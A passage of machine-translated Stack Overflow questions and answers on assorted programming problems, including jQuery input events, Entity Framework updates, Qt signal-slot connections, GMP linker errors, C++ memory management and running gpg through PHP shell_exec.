    console.log($(this).attr('name'));
  }
}); 
```

因此，“keydown”事件在按键实际对其调用的元素进行任何修改之前被触发，“keyup”是在触发之后。所以我获取之前的值并比较之后的新值，然后如果有变化我会做任何我必须做的事情..

我希望这有帮助

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-09-02T20:17:23.713

您可以在每次按键后强制模糊，以便立即有效地完成更改检查。

```
$myselector.on('change', function() { /*do something*/ });
$myselector.on('keyup', function() { $(this).blur(); $(this).focus(); }); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-08-27T21:59:35.863

你可以`setInterval()`在你的输入焦点事件中清除这个区间模糊和你相关的功能我认为这是自己捕捉输入变化的好方法。

例子：

```
var myInterval;
$("#text_object").focus(function (event) {
    myInterval = setInterval(function () {            
        listener(event);
    }, 100);
});

$("#text_object").blur(function (event) {
    clearInterval(myInterval);
});

function listener(event){
    clearInterval(myInterval);

    alert("I'm not getting here before the textarea loses focus");
} 
```

希望能帮助到你。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-04-12T14:17:26.330

我为你创建了这个，它不是最优雅的解决方案，但它有效

JS：

```
<script>
$(document).ready(function (d) {

    /* set initial value to "" (empty string), and not null
       we're going to use this to check if the value of the current text field has been changed */
    val = '';

    setInterval(function () {
        if (val !== $('textarea[name="checktext"]').val()) {

            // Value is not the same, fire action
            alert('val is different');

            // Update the current value
            val = $('textarea[name="checktext"]').val();
        } else {
            // Val is the same as textarea value
        }

    }, 50);

});
</script> 
```

HTML：

```
<textarea name="checktext"></textarea> 
```

此脚本仅适用于该特定文本区域，您可以更改它，也可以将**val**设置为文本输入数组。

我只是向您展示它背后的想法，使用 x 毫秒的 setInterval 来检查文本输入的值是否与**val**的值或您要使用的任何变量名称相同。如果它们不匹配则意味着它已被更改，如果它们匹配则意味着没有任何变化。

希望这个对你有帮助。

然而 HTML5 有解决方案

```
<script>
$(document).ready(function (d) {

    $('textarea[name="checktext"]').on('input', function () {
        alert('changed');
    });
});
</script> 
```

# c# - 完全禁用 CollectionEditor

> ID：10270458
> 
> 赞同：1
> 
> 时间：2012-04-22T17:48:07.907
> 
> 标签：c#, propertygrid, collectioneditor

我在 PropertyGrid 中使用自定义动态类对象（此处发布的代码太多）。简而言之，它的作用是允许我在运行时从任意输入创建属性（在本例中为 XML，但这不是重点）。这些属性可以是任何类型，包括另一个自定义类，因此它们可以无限嵌套。

我遇到的问题是 PropertyGrid 将此类视为一个集合，并且在 Value 列中有一个按钮，可让您打开 CollectionEditor。这（除其他外）具有添加和删除按钮，这两个按钮都会从根本上破坏自定义类。与其试图让这两个复杂的系统很好地协同工作，我宁愿干脆完全禁用 CollectionEditor。我有另一个系统，它允许您查看类的子对象（通过将 PropertyGrid.SelectedObject 设置为子对象）并且它工作正常。我希望用户甚至没有看到 CollectionEditor 的选项，因为它似乎与这个系统完全不兼容。

理想情况下，我只想在 Value 列中放置一个按钮，我可以捕获点击事件并自行处理，但这是可选的。我也不关心我是否只为有问题的行或整个 PropertyGrid 禁用 CollectionEditor。无论哪种方式我都没有使用它，所以任何使它无法访问的东西都会很好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T15:00:29.557

您是否尝试过派生自己的 CollectionEditor 并在其中覆盖一些方法/事件以使其形式不出现而直接返回而不做任何事情？

然后，您需要使用以下命令标记您的集合类型属性：

```
[EditorAttribute(typeof(MyCollectionEditor), typeof(System.Drawing.Design.UITypeEditor))] 
```

当单击 PropertyGrid 中标记的集合属性的“...”按钮时，这将自动启动您的 MyCollectionEditor。

您可能还需要继承 PropertyDescriptor 并覆盖 GetEditor 方法以返回您自己的 CollectionEditor。

# jquery - 悬停或单击一个 div 以影响另一个

> ID：10270459
> 
> 赞同：1
> 
> 时间：2012-04-22T17:48:21.300
> 
> 标签：jquery, css, hover

我希望能够将鼠标悬停在一个 div 上以影响另一个。

```
<div id="a">1</div>
<div id="b" style="display:none;">2</div> 
```

如何悬停#a并使#b出现？我想要一个 css3 解决方案，但 jquery 也很好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:06:19.263

这适用于铬：

[http://jsfiddle.net/iambriansreed/uQfKw/](http://jsfiddle.net/iambriansreed/uQfKw/)

HTML：

```
<div id="a">1</div>
<div id="b">2</div> 
```

CSS：

```
#a + #b {
    display: none;

}
#a:hover + #b {
    display: block;

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:54:07.070

```
$("#a").on({
     mouseenter: function() {
         $("#b").show();
     },
     mouseleave: function() {
         $("#b").hide();
     },
     click: function() {
         alert('Holy crap! Someone clicked me!');
     }
}); 
```

如果将#b 放在#a 中，则可以使用CSS 来完成，否则上面的jQuery 解决方案应该可以工作（使用jQuery 1.7+）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T18:01:15.613

css 解决方案需要它们是这样的：

```
<div id="a">1
    <div id="b">2</div>
</div> 
```

显示该块的 CSS 将是：

```
#a:hover #b{
    display: block;
} 
```

你可以在这里看到这两个例子：http: [//jsfiddle.net/skip405/L93x7/](http://jsfiddle.net/skip405/L93x7/)

# visual-studio-2010 - 从 NuGet 安装了引用，但 VS2010 找不到命名空间

> ID：10270462
> 
> 赞同：0
> 
> 时间：2012-04-22T17:48:31.053
> 
> 标签：visual-studio-2010, namespaces, facebook-c#-sdk

我对 C# 和 Visual Studio 很陌生，但我刚刚从 NuGet 下载了 Facebook C# SDK，但是当我尝试使用它时：

```
using Facebook; 
```

Visual Studio 说它找不到命名空间名称。我检查了我的参考列表，Facebook 在项目的参考列表中。

我试图按照这篇关于代码项目的帖子中的说明进行操作。 [http://www.codeproject.com/Articles/20032/Creating-a-simple-Facebook-Application-using-WPF](http://www.codeproject.com/Articles/20032/Creating-a-simple-Facebook-Application-using-WPF)

到目前为止，我在网上找到的所有示例都没有暗示这种性质的问题。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T21:38:48.907

有时，某些 NuGet 问题需要使用引用的程序集重新打开项目才能加载它。这个问题不是 Facebook 特有的。

# asp.net-mvc-3 - 查询数据库加载我的对象的属性之一，它不应该

> ID：10270464
> 
> 赞同：0
> 
> 时间：2012-04-22T17:48:42.877
> 
> 标签：asp.net-mvc-3, entity-framework-4.1

在我的编辑控制器操作中，我发布要更新的对象。

```
 [HttpPost]
 public virtual ActionResult Edit(Case myCase){
      var currentDocuments = db.CaseDocuments.Where(p => p.idCase == myCase.idCase);

            foreach (CaseDocument docInDB in currentDocuments )
            {
                var deleteDoc = true;

                foreach (CaseDocument docNew in myCase.CaseDocuments )
                {
                    if (docNew.idDocument == docInDB.idDocument)
                        deleteDoc = false;
                }
                if (deleteDoc )
                    db.CaseDocuments.Remove(docInDB);
            }

            foreach (CaseDocument pc in myCase.CaseDocuments)
            {
                if (pc.idDocument == 0)
                    db.CaseDocuments.Add(pc);
                else
                    db.Entry(pc).State = EntityState.Modified;    
            }

           *** **db.Entry(myCase).State = EntityState.Modified;**  //THIS LINE
            db.SaveChanges();
 } 
```

该`Case`模型有一个集合`Documents`，它们与案例模型一起发布。

进入操作后，我可以计算集合中的文档数量，假设有 3 个。

然后，为了查看是否需要从数据库中删除文档（因为用户从 UI 中删除了文档），我需要以这种方式从数据库中获取该案例的文档：

```
var currentDocuments = db.CaseDocuments.Where(p => p.idCase == myCase.idCase); 
```

这里开始了奇怪的事情：一旦我执行该语句，它`myCase.Documents`就会加载它在数据库中的内容（假设有 4 个）！因此，我无法比较这两个集合（以检测文档是否被删除并将其从数据库中删除）。

我需要的是在我的案例模型的编辑操作期间，我需要创建/更新/修改其文档。**我需要从其他角度看这个吗？我在做什么是错的？**

***编辑：*** 在评论之后，我意识到我将 myCase 标记为已修改的那一行是在开头，我想这就是这种行为的原因。

现在，将该行移至 db.SaveChanges() 之前，解决了该问题，但在`db.Entry(myCase).State = EntityState.Modified;` “ *ObjectStateManager 中已经有一个具有相同键的对象。* ”

**我在这里做错了什么？这段代码看起来很糟糕！**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T10:44:05.473

试试这种方式：

```
 [HttpPost]
 public virtual ActionResult Edit(Case myCase){
     var currentDocumentIds = db.CaseDocuments
                                .Where(p => p.idCase == myCase.idCase)
                                .Select(p => p.idDocument);

     foreach (int idInDb in currentDocumentsIds.Where(i => !myCase.CaseDocuments
                                                                  .Any(ci => ci.idDocumnet == i))
     {
         var docToDelete = new CaseDocument { idDocument = idInDb };
         db.CaseDocuments.Remove(docToDelete);
     }

     foreach (CaseDocument pc in myCase.CaseDocuments)
     {
         if (pc.idDocument == 0)
            db.CaseDocuments.Add(pc);
         else
            db.Entry(pc).State = EntityState.Modified;    
     }

     db.Entry(myCase).State = EntityState.Modified;
     db.SaveChanges();
} 
```

编辑：此代码和您的代码之间的区别在于它与现有文档的工作方式。它不加载它们 - 它只加载它们的 ID。这样，您将节省一些从数据库传输的数据，但它也应该可以帮助您避免该异常。当您从数据库加载文档时，您已经将它附加在上下文中，但是如果您尝试调用它：

```
db.Entry(pc).State = EntityState.Modified; 
```

您将尝试将具有相同键的文档的另一个实例附加到上下文中。这是不允许的 - 上下文只能附加具有唯一键的单个实例。

# c++ - 将事件/动作连接到 QPlainTextEdit

> ID：10270470
> 
> 赞同：1
> 
> 时间：2012-04-22T17:49:06.917
> 
> 标签：c++, qt

我有一个`QTabWidget`包含 QPlainTextEdit。我已设法向 QTabWidget 添加操作，以便每当打开新选项卡时，也会在新选项卡中添加一个新的 QPlainTextEdit。见代码。

```
#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QPlainTextEdit>
#include <QMessageBox>
#include <QAction>
#include <QTextCursor>
#include <iostream>
#include <QKeyEvent>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    setWindowTitle("Tilde");
    current_tab = 1;
    on_action_New_triggered();
    ui->tabWidget->setTabsClosable(true);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_action_New_triggered()
{
    QString newTab = "Tab " + QString::number(current_tab);
    ui->tabWidget->addTab(new QPlainTextEdit, newTab);
    ui->tabWidget->setCurrentIndex(current_tab - 1);
    current_tab++;
    editor = qobject_cast<QPlainTextEdit *>(ui->tabWidget->currentWidget());
    editor->setFocus();
    /*connect(editor->document(), SIGNAL(cursorPositionChanged(QTextCursor)),
            this, SLOT(on_editor_cursorPositionChanged()));*/
}

void MainWindow::on_actionNew_document_triggered()
{
    on_action_New_triggered();
}

void MainWindow::on_action_Exit_triggered()
{
    QMessageBox msg;
    msg.addButton(QMessageBox::Yes);
    msg.addButton(QMessageBox::No);
    msg.setText("Exit program?");

    int selection = msg.exec();

    if (selection == QMessageBox::Yes)
        qApp->exit(0);
}

// highlight current line
void MainWindow::on_editor_cursorPositionChanged()
{
    QTextEdit::ExtraSelection highlight;
    highlight.cursor = editor->textCursor();
    highlight.format.setProperty(QTextFormat::FullWidthSelection, true);
    highlight.format.setBackground( QColor(240, 246, 217) );

    QList<QTextEdit::ExtraSelection> extras;
    extras << highlight;
    editor->setExtraSelections(extras);
} 
```

注释代码给出编译器错误：

> QMetaObject::connectSlotsByName：on_editor_cursorPositionChanged() 没有匹配信号

我已经在头文件中添加了该函数。

头文件：

```
#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QPlainTextEdit>
#include <QTextCursor>

namespace Ui
{
    class MainWindow;
}

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    explicit MainWindow(QWidget *parent = 0);
    ~MainWindow();

private slots:
    void on_action_New_triggered();
    void on_actionNew_document_triggered();
    void on_action_Exit_triggered();
    void on_editor_cursorPositionChanged();

private:
    Ui::MainWindow *ui;
    QPlainTextEdit *editor;
    qint8 current_tab;
};

#endif // MAINWINDOW_H 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:07:06.167

会不会是您对 SLOT 的签名有误？

```
/*connect(editor->document(), SIGNAL(cursorPositionChanged(QTextCursor)),
            this, SLOT(on_editor_cursorPositionChanged()));*/ 
```

应该？

```
connect(editor->document(), SIGNAL(cursorPositionChanged(QTextCursor)),
            this, SLOT(on_editor_cursorPositionChanged(QTextCursor))); 
```

此外，您用于该插槽的命名约定可能与您的手动连接发生冲突。Qt 可能会尝试`connectSlotsByName`通过匹配名称来使用 SLOT 上的机制： `on_<member>_<signal>`

在这种情况下，该 SLOT 的当前签名`on_editor_cursorPositionChanged()`将与 QPlainTextEdit`editor`成员匹配。然后您使用错误的签名手动将文档连接到它。您可能应该创建另一个名称更正常的插槽`docCursorPosChanged(QTextCursor)`

# java - Java：通过布尔值、空指针或异常传递错误？

> ID：10270471
> 
> 赞同：0
> 
> 时间：2012-04-22T17:49:12.967
> 
> 标签：java

我认为这是一个简单但重要的问题。

我正在编写一个带有函数的类：

```
public MyClass myFunction(MyClass mc) { ... } 
```

在这个函数中，它改变了 mc 的一些状态并将其返回。我知道这没有必要，因为 mc 已经到位。我要返回 MyClass 的原因是使用 null 表示更新失败。

我可能会将返回类型更改为布尔值并使用 false 来指示错误：

```
public boolean myFunction(MyClass mc) { ... } 
```

但我记得我很久以前读过一篇文章说这不是一个好习惯（虽然我忘记了细节和原因）。

我当然可以使用异常来表示错误：

```
public void myFunction(MyClass mc) throws MyException { ... } 
```

但我觉得这太重了。

我个人的观点是，如果错误在系统范围内有意义，那么应该使用异常。如果错误只对调用者和函数有意义，则不应使用异常。但是在这种情况下我应该使用 null 或 false 来指示错误吗？

您认为最佳做法是什么？请让我知道你的意见。

非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T17:52:02.937

失败是更新过程的预期部分吗？还是只有当一切都发生灾难性错误时才会发生？

如果这是一个真正的异常情况，那么您应该更喜欢使用异常。这类事情的返回值往往会被忽略（看看一些可怕的布尔返回`File`函数，比如`mkdirs`）

如果失败是尝试进行更新的预期部分，那么您应该返回布尔值或某种状态对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:58:45.087

通常不赞成的做法是使用某种返回代码（一个 int 等）来代替引发异常。如果更新失败是“正常”行为，则返回布尔值即可。例如，Collection.add 就是这样做的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T19:31:58.660

从您列出的三个选项中，我*不会*使用第一个。

```
public MyClass myFunction(MyClass mc) { ... } 
```

在这种情况下，myFunctions 要么返回它的参数 (mc)，要么返回 null - 只有两个选项可用，所以它基本上与

```
public boolean myFunction(MyClass mc) { ... } 
```

正如 Steven Schlansker 所说，您应该决定失败的更新是否真的是异常状态，还是应该由用户处理的预期状态。

还有一点需要注意：如果您决定将其实现为返回布尔值（不抛出异常）的方法，那么我建议您可以确定对*MyClass mc*对象*没有更改或所有更改。*

 *例如，如果 myFunction 应该更新 MyClass 中的 3 个字段 ( *x,y,z* )。如果您调用*myFunction(mc)*并且它能够更新其中两个（*x,y ）并且在更新第三个（* *z* ）时失败，则它返回*false*。然后您的*MyClass mc*对象处于不一致状态，因为*x 和 z*已更新，但*z*没有。如果用户决定继续使用现有的*mc*对象，这可能会导致进一步的问题。如果您决定将*myMethod*实现为引发异常的方法，则可能更容易理解该对象可能处于无效状态。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-22T06:12:41.737

这取决于调用者函数。

如果调用者函数需要该对象的值

```
 then you should return Null in case of failure 
             and return the OBJECT in case  of success 
```

如果调用者函数只需要对象的状态是否更新

```
 then return true in case of success 
             and return false in case of failure 
```*

# javascript - JSOUP：从 HTML 文档中解析 Javascript 字段？

> ID：10270473
> 
> 赞同：2
> 
> 时间：2012-04-22T17:49:16.653
> 
> 标签：javascript, parsing, jsoup

我对 JSOUP 相当陌生，并且在标签或 id 值上使用 Element.select 进行解析没有问题。我遇到的问题是如何筛选页面中的 javascript 代码。在这里我加载文档：

```
Document doc = Jsoup.connect(pageUrl)
                .userAgent(Agent)
                .timeout(5000)
                .get(); 
```

我试图提取的 javascript 字段值如下：

```
arrayGPSLocation["0"]    = "-19473982376,6848295867";
arrayGPSLocation["1"]    = "-19473982376,6848296245"; 
```

由于这些数组值不在标准代码标记 <> 中，因此 JSOUP 是执行此操作的适当方法吗？我喜欢 JSOUP 的 API。唯一的其他方法是将字符串例程组合在一起......即：

```
int start = pageBuffer.indexOf("arrayGPSLocation[\" + counter + \"]");
int end = pageBuffer.indexOf(";");
String result = pageBuffer.subString(start,end); 
```

这个伪代码示例在解析大页面时会出现严重的性能问题。有谁知道如何使用 JSOUP 完成此任务，或者我应该编写自己的刮板吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T19:18:26.477

您可以使用 Jsoup 做的所有事情 - 选择包含 javascript 代码的元素，将其值作为字符串获取并使用此字符串。就像你在例子中那样做。

# c - 如何用 C 制作一个显示网页的程序？

> ID：10270474
> 
> 赞同：0
> 
> 时间：2012-04-22T17:49:22.247
> 
> 标签：c, linux, http, sockets

我有兴趣在 Linux 系统下使用 C 和套接字库（或任何其他库）创建 Web 浏览器。

我的 Web 浏览器的基本用途是将网页的 HTML 呈现为用户可读的内容。

我只是希望有人指出我正确的方向。我对 C 语言中的套接字及其系统调用也有很好的理解......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:58:06.590

指向正确方向的指针，嗯？

好吧，网络浏览器由一堆一起工作的系统组成。即使是最基本的网络浏览器也必须至少理解 HTTP/1.1 和 HTML。

它必须能够从远程服务器获取页面，将 HTML 解析为 DOM，将其渲染到视口，捕获鼠标点击，让它们激活超链接并导航到新页面。

但是，如果它只能做到这一点，那对于网络浏览器来说就是一个糟糕的借口；即使是最简单的网络浏览器也应该能够解析和应用 CSS；显示 JPEG、PNG 和 BMP 图像、解析 XML、执行 JavaScript、处理 cookie、离线存储、插件（如闪存）以及大约一百万种其他东西。

当然，我要说明的一点是，Web 浏览器在很多方面都不是学习软件项目的好项目，因为与基本功能相关的开销也很严重。

# c++ - Linux上的GMP（MPIR）链接器错误

> ID：10270478
> 
> 赞同：0
> 
> 时间：2012-04-22T17:49:32.483
> 
> 标签：c++, c, gcc, linker, gmp

我使用 mpir（在 Windows 上）编写了一个公私钥生成器，它工作正常。

当我尝试使用 gmp 库在 linux 机器上编译它时，它会引发一大堆链接器错误。

```
/usr/bin/ld: /usr/lib/debug/usr/lib/crt1.o(.debug_info): relocation 0 has invali
d symbol index 11
/usr/bin/ld: /usr/lib/debug/usr/lib/crt1.o(.debug_info): relocation 1 has invali
d symbol index 12
/usr/bin/ld: /usr/lib/debug/usr/lib/crt1.o(.debug_info): relocation 2 has invali
d symbol index 2
/usr/bin/ld: /usr/lib/debug/usr/lib/crt1.o(.debug_info): relocation 3 has invali
d symbol index 2
/usr/bin/ld: /usr/lib/debug/usr/lib/crt1.o(.debug_info): relocation 4 has invali
d symbol index 11
/usr/bin/ld: /usr/lib/debug/usr/lib/crt1.o(.debug_info): relocation 5 has invali
d symbol index 13
/usr/bin/ld: /usr/lib/debug/usr/lib/crt1.o(.debug_info): relocation 6 has invali
d symbol index 13
...
/usr/lib/gcc/x86_64-linux-gnu/4.4.3/../../../../lib/crt1.o: In function `_start'
:
(.text+0x20): undefined reference to `main'
collect2: ld returned 1 exit status 
```

我正在使用`g++ -lgmp prime.cpp`. 我没有使用任何非 gmp 功能。任何的想法？我没有添加代码，因为它有很多。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:09:24.367

> 我正在使用 g++ -lgmp prime.cpp

此命令行以两种方式中断：

1.  你忽略了提供定义`main`
2.  您在引用它的源之前指定了库。应该：

    `g++ main.cpp prime.cpp -lgmp`

    命令行上的库和源/对象的顺序[很重要](http://webpages.charter.net/ppluzhnikov/linker.html)。

更新：

> 有几个文件..主文件取决于它们，所以在构建它之前..我试图构建其他文件。

在这种情况下，正确的命令是：

```
# Compile, but don't link, prime.cpp
g++ -c prime.cpp 
```

# c# - 当前上下文中不存在名称“temp”（C# 桌面应用程序）

> ID：10270479
> 
> 赞同：2
> 
> 时间：2012-04-22T17:49:51.750
> 
> 标签：c#, static-classes

我正在使用以下代码制作 C# 桌面应用程序：

```
static class ClassA
{
     public static string Process()
     {
          string temp = Functions.Test();
          return temp;
     }
}

static class Functions
{
     public static string Test()
     {
          return "ok";
     }
} 
```

问题是变量“temp”没有从 Test() 函数中获得任何值。当我尝试在即时窗口中检查其值时，我收到消息“当前上下文中不存在名称‘temp’”

ClassA 和 Functions 都在不同的类文件中，但属于同一个命名空间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-02-22T20:44:49.960

我知道这是一个较老的问题，但希望这也能帮助新开发人员：我遇到了一个类似的问题，并意识到我的两个类（位于两个不同的项目中）针对的是两个不同的框架。一旦我将它们切换到目标 Net Framework 4.5，它们就可以完美地编译并且没有这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-23T18:29:12.120

我可以重现错误的唯一方法是检查

```
? temp 
```

*在代码未运行时*的即时窗口中。

如果您通过调用实际方法

```
? ClassA.Process() 
```

它工作得很好。

此外，如果您在该行上放置一个断点`return temp;`并运行您的程序，即时窗口将在检查时给出正确的结果

```
? temp 
```

当调试器在您的断点处停止时。此时`temp` *将*在当前上下文中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T23:51:23.543

尝试

```
static class ClassA
{
 string temp = Functions.Test();
 public static string Process()
 {
      return temp;
 }
}

static class Functions
{
 public static string Test()
 {
      return "ok";
 }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-22T17:57:01.073

将以下内容添加到您的代码中：

```
class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine(ClassA.Process());
        Console.ReadLine();
    }
} 
```

返回“确定”

您的代码还有其他问题。

# java - 属性文件返回 null

> ID：10270480
> 
> 赞同：0
> 
> 时间：2012-04-22T17:50:00.910
> 
> 标签：java

我正在尝试从属性文件中读取值，当我尝试运行该程序时，它给出的输出为
`null`

```
import java.io.FileInputStream;
import java.util.Properties;
public class JavaApplication1 {
final private static String osName = System.getProperty("os.name");
static final Properties configFile = new Properties() {

    {
        try {
            configFile.load(new FileInputStream("config.properties"));
        } catch (Exception e) {
        }
    }
};
private static String DIR = osName.equals("Linux") ? configFile.getProperty("tempDirForLinux") : configFile.getProperty("tempDirForWindows");
public static void main(String[] args) {
    System.out.println(DIR);
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:23:21.310

在您的示例中有点奇怪的部分是您创建一个匿名 Properties 类，然后在初始化语句中将属性加载到同一类中。我不确定这是如何工作的（我猜不是）

这可能是你想要的

```
public class JavaApplication1 {
    final private static String osName = System.getProperty("os.name");
    static final Properties configFile = new Properties();

    static {
        try {
            configFile.load(new FileInputStream("config.properties"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    };

    private static String DIR = osName.equals("Linux") ? configFile.getProperty("tempDirForLinux") : configFile.getProperty("tempDirForWindows");

    public static void main(String[] args) throws IOException {
        System.out.println(DIR);
    }
} 
```

# java-me - PIM 事件 + j2me

> ID：10270484
> 
> 赞同：-1
> 
> 时间：2012-04-22T17:50:10.877
> 
> 标签：java-me, jsr75

如何制作 PIM 事件的实例并为其设置 thsi 属性

```
public String eventType;
public Date eventFromDate;
public Date eventToDate;
public Date alarmFromDate;
public Date alarmToDate;
public Vector recepient;
public String descriptionOfEvent; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T09:37:53.783

[以下](http://www.developer.nokia.com/Community/Wiki/CS001198_-_Adding_a_new_calendar_event_in_Java_ME)是如何使用 PIM API 将事件添加到日历的示例

# c++ - 分配后我必须在哪里释放内存？

> ID：10270487
> 
> 赞同：0
> 
> 时间：2012-04-22T17:50:38.707
> 
> 标签：c++

我正在尝试为内存分配做一些练习。

我有以下代码正在运行，但有两个问题。

分配后我必须在哪里使用 delete [ ] 来释放内存？

为什么使用 show() 函数时此代码在函数处的输出是 CDcar？。

```
#include <cstdlib>
#include <new>
#include <iostream>
#include <cstring>
using namespace std;

class automobile {

    private:

        char (*function)[30];
        char *type;
        double speed;

    public:

        automobile ( );
        automobile (double , char *);
        void speed_up (double);
        void speed_down(double);
        const char * get_function ( ) const;
        void show ( );

};

automobile::automobile ( ) {

    speed = 0;
    function = new char [1][30];
    strcpy(function[1], "CD player with MP3");

    type = new char [4];
    strcpy(type, "car");

}

automobile::automobile(double spd, char * fn ) {

    int sz;

}

void automobile::show ( ) {

    cout << "This is a " << type << " and it has the following functions: " << function[1] << ", and its speed is " << speed << " km/h\n"; 

}

int main ( ) {

    automobile car;

    car.show ( );

    return 0;
} 
```

这是输出：

```
This is a car and it has the following functions: CDcar, and its speed is 0 km/h 
```

我认为输出应该是这样的：

```
This is a car and it has the following functions: CD player with MP3, and its speed is 0 km/h 
```

请指教

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:04:24.553

> 分配后我必须在哪里使用 delete [ ] 来释放内存？

理想**无处**。`new`并且`delete`是不适合大多数代码的 C++ 特性。它们容易出错且级别太低。它们仅对基本构建块有用。

显示的代码可以受益于基本的构建块[`std::string`](http://en.cppreference.com/w/cpp/string/basic_string)，如[`std::vector`](http://en.cppreference.com/w/cpp/container/vector).

* * *

显示的代码还至少在一个地方调用了未定义的行为：

```
function = new char [1][30];
strcpy(function[1], "CD player with MP3"); 
```

数组是从 0 开始的，所以`function[1]`是越界访问。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-22T17:56:11.060

你应该调用`delete[]`你的类的析构函数。

```
//Called when your class is destroyed.
automobile::~automobile()
{
   delete[] function;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-22T17:59:56.100

1.  你应该将`delete[]`for`function`和`type`放在[析构函数](http://www.cplusplus.com/doc/tutorial/classes/) `~automobile`中（你目前没有，所以你必须创建它）。

2.  关于输出：您的角色是数组定义不明确。考虑[`std::vector<string>`](http://www.cplusplus.com/reference/stl/vector/)用于此类事情（容易得多）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-22T18:18:31.810

您的输出不正确 b/c 以下内容：

```
 speed = 0;
 function = new char [1][30];
 strcpy(function[1], "CD player with MP3"); 
```

这应该是

```
 speed = 0;
 function = new char [1][30];
 strcpy(function[0], "CD player with MP3"); 
```

当你输出时，你应该是 cout'ing`function[0]`而不是`function[1]`.

话虽如此，您几乎应该总是尝试消除对 new 和 delete 的手动调用。它有助于可维护性，并有助于保持代码异常安全。在这种情况下，您可以通过使用标准 C++ 库提供的向量和字符串免费获得它。在更一般的意义上，您要遵循[RAII Idiom](http://en.wikipedia.org/wiki/Resource_Acquisition_Is_Initialization)。这将有助于 C++ 和内存管理在你的学习/职业生涯中减少几年的时间。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-22T17:56:09.623

内部〜汽车析构函数。

# php - 让 apache 用户使用 shell_exec() 调用脚本；

> ID：10270488
> 
> 赞同：2
> 
> 时间：2012-04-22T17:50:39.473
> 
> 标签：php, apache, permissions, gnupg, shell-exec

**PHP - CentOS - Apache**

我试图让用户加密/解密我网站上的文件。我已经选择 gpg 作为我要加密/解密的方式。问题是我需要使用加密命令运行 shell_exec，并且从浏览器调用时它似乎没有运行。我已经尝试了我能想到的一切，包括给所有涉及777权限的文件夹和文件，感觉不对。

我想我可以通过设置一个 cronjob 和一个队列来实现这一点，但我希望有人知道更好的解决方案。

这些是不会运行的命令..

```
gpg --yes --passphrase=[Enter your passphrase here] -c filename.txt

gpg --yes --passphrase=[Enter your passphrase here] filename.txt.gpg 
```

编辑：我回显了我发送给 shell_exec 的命令，它从命令行运行良好。但是它不会从浏览器运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T10:03:50.777

`/usr/bin/gpg --yes --passphrase=[Enter your passphrase here] -c absolute_path_to_file`在 shell_exec 中尝试 gpg 的完整路径

# javascript - 修改脚本以在 AM/PM 前后包含 DIV

> ID：10270490
> 
> 赞同：0
> 
> 时间：2012-04-22T17:50:59.740
> 
> 标签：javascript

如何修改此脚本以将 AM/PM 文本包含在 div 中？

我已经尝试用 div 修改它输出 ampm 的区域，但它没有将元素放在 div 中，而是将 and 标记显示为纯文本。

```
function myTime() {
var dst = 0;       // set to 1 for daylight savings time
                   // update this as you go on and off daylight saving time
var loc = ''; // set to your location
var mtz = -5;      // set to your local timezone (hours ahead of UTC, negative if behind)
var stdz = ''; // standard time indicator
var dayz = ''; // daylight saving time indicator (blank if you dont have daylight saving)
var showDate = 0; // 0 = don't show, 1 = international format, 2 = US format

// do not alter anything below this line
var newP = document.createElement("div"); var txt = '' + loc + ' '; var newT = document.createTextNode(txt); newP.appendChild(newT); var newP2 = document.createElement("div"); newP2.id = 'time'; var txt2 = setDsp(mtz,dst,stdz,dayz,showDate); var newT2 = document.createTextNode(txt2); newP2.appendChild(newT2); var frag = document.createDocumentFragment(); frag.appendChild(newP); frag.appendChild(newP2); var d2 = document.getElementById('datetime'); d2.parentNode.replaceChild(frag,d2);
setTimeout('updDsp('+mtz+',' +dst+',"' +stdz+'","' +dayz+'","'+showDate+'")', 5000);}
var pageLoaded = 0; window.onload = function() {pageLoaded = 1;}
function loaded(i,f) {if (document.getElementById && document.getElementById(i) != null) f(); else if (!pageLoaded) setTimeout('loaded(\''+i+'\','+f+')',100);
}
function updDsp(mtz,dst,stdz,dayz,showDate) {var obj = document.getElementById('time'); obj.firstChild.data = setDsp(mtz,dst,stdz,dayz,showDate); setTimeout('updDsp('+mtz+ ','+dst+ ',"'+stdz+ '","'+dayz+ '","'+showDate+'")', 5000);}
